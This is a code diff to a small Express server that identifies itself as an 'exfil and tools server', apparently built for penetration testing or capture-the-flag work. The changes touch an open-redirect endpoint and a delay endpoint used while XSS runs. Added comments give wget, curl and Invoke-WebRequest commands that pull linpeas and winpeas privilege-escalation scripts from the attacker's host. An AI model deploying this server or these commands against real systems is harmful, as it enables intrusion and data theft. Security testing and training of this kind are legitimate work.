@@ -115,7 +115,9 @@ app.all("/b64/*", (req, res) => {
  * Serve redirect for url
  */
 app.all("/redirect/*", (req,res) => {
-  res.redirect(req.url.replace(/^\/redirect\//,''));
+  const url = decodeURIComponent(req.url.replace(/^\/redirect\//,''));
+  console.log('Redirecting to:', url);
+  res.redirect(url);
 });
 
 /*
@@ -123,11 +125,14 @@ app.all("/redirect/*", (req,res) => {
  * while XSS executes or similar
  */
 app.all("/delay/:seconds", (req, res) => {
-  setTimeout(() => req.sendStatus(200),parseInt(req.params.seconds * 1000));
+  setTimeout(() => res.sendStatus(200),parseInt(req.params.seconds * 1000));
 });
 
 /*
  * Serve up tools or other files
+ * Invoke-WebRequest -Uri 'http://host:8080/winpeas.bat' -OutFile .\winpeas.bat
+ * wget http://host:8080/linpeas.sh
+ * curl http://host:8080/linpeas.sh -o lp.sh
  */
 app.use(express.static(dir));
 app.listen(port, () => console.log(`exfil and tools server listening on port ${port}!`));
